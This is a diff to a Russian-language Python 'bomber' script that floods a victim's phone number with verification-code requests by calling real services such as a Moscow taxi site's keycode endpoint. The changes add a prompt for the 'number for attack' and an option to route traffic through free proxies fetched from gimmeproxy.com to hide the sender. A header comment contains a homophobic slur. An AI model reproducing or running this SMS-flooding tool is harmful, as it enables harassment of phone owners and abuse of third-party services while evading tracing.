@@ -1,5 +1,10 @@
+# flexagoon, спасибо за рефакторинг) by lkqas
+# кто спиздит код - тот пидор) By lkqas
 import time, os, random, requests, sys, re
 from termcolor import colored
+from requests import get
+import random
+from random import choice
 
 os.system("clear")
 
@@ -12,31 +17,34 @@ def net_check():
     try:
         requests.get('https://www.google.com', verify=True)
     except:
-        print("\nпохоже что у вас плохой интернет, либо вы используете прокси....")
-        print('Возобновите интернет и перезайдите в бомбер...\n')
+        print(colored("Замечен плохой интернет....",'red'))
+        print(colored('Возобновите интернет, и перезайдите в бомбер...','red'))
         sys.exit()
+
+def proxy():
+    print(colored("Использовать прокси? (y/n)",'green'))
+    proxy = input(" >> ")
+    if proxy.lower() == "y":
+        proxies = generate_proxy()
+    else:
+        proxies = None
+
+def generate_proxy():
+    proxy = get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
+    return {"http": proxy, "https": proxy}
 	
 def phone_check(phone):
 	pat = re.compile(r"(\+?7|8|)9\d{9}")
 	if not re.fullmatch(pat, phone):
-		print("\nНеверный номер телефона!")
+		print(colored("\nНеверный номер телефона!",'green'))
 		sys.exit()
 	
 def spam():
+	os.system("clear")
 	net_check()
-	
-	slowprint(colored('''
-	┏━━━┳━━━┳━━━┳━━┓┏━━━┳━┓┏━┳━━┓┏━━━┳━━━┓
-	┃┏━┓┃┏━┓┣┓┏┓┃┏┓┃┃┏━┓┃┃┗┛┃┃┏┓┃┃┏━━┫┏━┓┃
-	┃┃╋┗┫┃╋┃┃┃┃┃┃┗┛┗┫┃╋┃┃┏┓┏┓┃┗┛┗┫┗━━┫┗━┛┃
-	┃┃┏━┫┃╋┃┃┃┃┃┃┏━┓┃┃╋┃┃┃┃┃┃┃┏━┓┃┏━━┫┏┓┏┛
-	┃┗┻━┃┗━┛┣┛┗┛┃┗━┛┃┗━┛┃┃┃┃┃┃┗━┛┃┗━━┫┃┃┗┓
-	┗━━━┻━━━┻━━━┻━━━┻━━━┻┛┗┛┗┻━━━┻━━━┻┛┗━┛
-	by @lkqas
-	version 0.8
-	''','yellow'))
+	proxy()
 
-	_phone = input('Enter number for attack (79xxxxxxxxx)-->> ')
+	_phone = input(colored("Введите номер для атаки (79xxxxxxxxx)-->>" ,'green'))
 
 	phone_check(_phone)
 	
@@ -70,7 +78,7 @@ def spam():
 		except:
 			print('[-] Grab не отправлено!')
 
-	    try:
+		try:
 			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
 			print('[+] RuTaxi отправлено!')
 		except:
